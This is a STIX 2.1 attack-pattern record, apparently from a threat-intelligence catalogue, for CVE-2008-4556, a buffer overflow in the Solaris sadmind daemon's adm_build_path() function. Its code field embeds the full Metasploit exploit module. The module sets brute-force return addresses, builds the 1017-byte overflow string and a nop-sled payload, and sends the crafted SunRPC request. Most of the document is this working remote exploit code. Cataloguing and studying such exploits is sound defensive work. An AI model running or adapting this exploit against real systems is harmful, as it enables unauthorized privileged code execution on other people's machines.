{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4ef34db6-fad3-4cde-98c1-8e16208ba4dd",
    "created": "2024-08-14T16:33:51.331113Z",
    "modified": "2024-08-14T16:33:51.331117Z",
    "name": "Sun Solaris sadmind adm_build_path() Buffer Overflow",
    "description": " This module exploits a buffer overflow vulnerability in adm_build_path() function of sadmind daemon.  The distributed system administration daemon (sadmind) is the daemon used by Solstice AdminSuite applications to perform distributed system administration operations.  The sadmind daemon is started automatically by the inetd daemon whenever a request to invoke an operation is received. The sadmind daemon process continues to run for 15 minutes after the last request is completed, unless a different idle-time is specified with the -i command line option. The sadmind daemon may be started independently from the command line, for example, at system boot time. In this case, the -i option has no effect; sadmind continues to run, even if there are no active requests. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/sunrpc/sadmind_adm_build_path.rb",
            "external_id": "sadmind_adm_build_path.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4556"
        },
        {
            "source_name": "reference",
            "url": "http://risesecurity.org/advisories/RISE-2008001.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::SunRPC\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sun Solaris sadmind adm_build_path() Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability in adm_build_path()\n        function of sadmind daemon.\n\n        The distributed system administration daemon (sadmind) is the daemon used by\n        Solstice AdminSuite applications to perform distributed system administration\n        operations.\n\n        The sadmind daemon is started automatically by the inetd daemon whenever a\n        request to invoke an operation is received. The sadmind daemon process\n        continues to run for 15 minutes after the last request is completed, unless a\n        different idle-time is specified with the -i command line option. The sadmind\n        daemon may be started independently from the command line, for example, at\n        system boot time. In this case, the -i option has no effect; sadmind continues\n        to run, even if there are no active requests.\n      },\n      'Author'         =>\n        [\n          'Ramon de C Valle',\n          'Adriano Lima <adriano[at]risesecurity.org>',\n        ],\n      'Arch'           => ARCH_X86,\n      'Platform'       => 'solaris',\n      'References'     =>\n        [\n          ['CVE', '2008-4556'],\n          ['OSVDB', '49111'],\n          ['URL', 'http://risesecurity.org/advisories/RISE-2008001.txt'],\n        ],\n      'Privileged'     => true,\n      'License'        => MSF_LICENSE,\n      'Payload'        =>\n        {\n          'Space' => 1024,\n          'BadChars' => \"\\x00\",\n        },\n      'Targets'       =>\n        [\n          [\n            'Sun Solaris 9 x86 Brute Force',\n            {\n              'Arch'       => [ ARCH_X86 ],\n              'Platform'   => 'solaris',\n              'Nops'       => 1024 * 32,\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0x08062030 },\n                  'Stop'  => { 'Ret' => 0x08072030 },\n                  'Step'  => 1024 * 30,\n                }\n            }\n          ],\n          [\n            'Sun Solaris 9 x86',\n            {\n              'Nops'       => 1024 * 4,\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0x08066a60 + 2048 },\n                  'Stop'  => { 'Ret' => 0x08066a60 + 2048 },\n                  'Step'  => 1,\n                }\n            }\n          ],\n          [\n            'Debug',\n            {\n              'Nops'       => 1024 * 4,\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xaabbccdd },\n                  'Stop'  => { 'Ret' => 0xaabbccdd },\n                  'Step'  => 1,\n                }\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-10-14'\n    ))\n\n  end\n\n  def brute_exploit(brute_target)\n    begin\n      sunrpc_create('udp', 100232, 10)\n    rescue Rex::Proto::SunRPC::RPCTimeout, Rex::Proto::SunRPC::RPCError => e\n      vprint_error(e.to_s)\n      return\n    end\n\n    unless @nops\n      print_status('Creating nop block...')\n      if target['Nops'] > 0\n        @nops = make_nops(target['Nops'])\n      else\n        @nops = ''\n      end\n    end\n\n    print_status(\"Trying to exploit sadmind with address 0x%.8x...\" % brute_target['Ret'])\n\n    hostname = 'localhost'\n\n    # buf1 = rand_text_alpha(1017) + [brute_target['Ret']].pack('L')\n    buf1 = \"A\" * 1017 + [brute_target['Ret']].pack('L')\n    buf2 = @nops + payload.encoded\n\n    header =\n      Rex::Encoder::XDR.encode(0) * 7 +\n      Rex::Encoder::XDR.encode(6, 0, 0, 0, 4, 0, 4, 0x7f000001, 100232, 10,\n        4, 0x7f000001, 100232, 10, 17, 30, 0, 0, 0, 0,\n        hostname, 'system', rand_text_alpha(16))\n\n    body =\n      do_int('ADM_FW_VERSION', 1) +\n      do_string('ADM_LANG', 'C') +\n      do_string('ADM_REQUESTID', '00009:000000000:0') +\n      do_string('ADM_CLASS', 'system') +\n      do_string('ADM_CLASS_VERS', '2.1') +\n      do_string('ADM_METHOD', buf1) +\n      do_string('ADM_HOST', hostname) +\n      do_string('ADM_CLIENT_HOST', hostname) +\n      do_string('ADM_CLIENT_DOMAIN', '') +\n      do_string('ADM_TIMEOUT_PARMS', 'TTL=0 PTO=20 PCNT=2 PDLY=30') +\n      do_int('ADM_FENCE', 0) +\n      do_string('X', buf2) +\n      Rex::Encoder::XDR.encode('netmgt_endofargs')\n\n    request = header + Rex::Encoder::XDR.encode(header.length + body.length - 326) + body\n\n    begin\n      # two seconds timeout for brute force\n      sunrpc_call(1, request, 2)\n    rescue Rex::Proto::SunRPC::RPCTimeout\n      print_status('Server did not respond, this is expected')\n    rescue Rex::Proto::SunRPC::RPCError => e\n      print_error(e.to_s)\n    end\n\n    sunrpc_destroy\n    handler\n  end\n\n  def do_string(str1, str2)\n    Rex::Encoder::XDR.encode(str1, 9, str2.length + 1, str2, 0, 0)\n  end\n\n  def do_int(str, int)\n    Rex::Encoder::XDR.encode(str, 3, 4, int, 0, 0)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-14",
    "x_mitre_platforms": [
        "solaris'"
    ]
}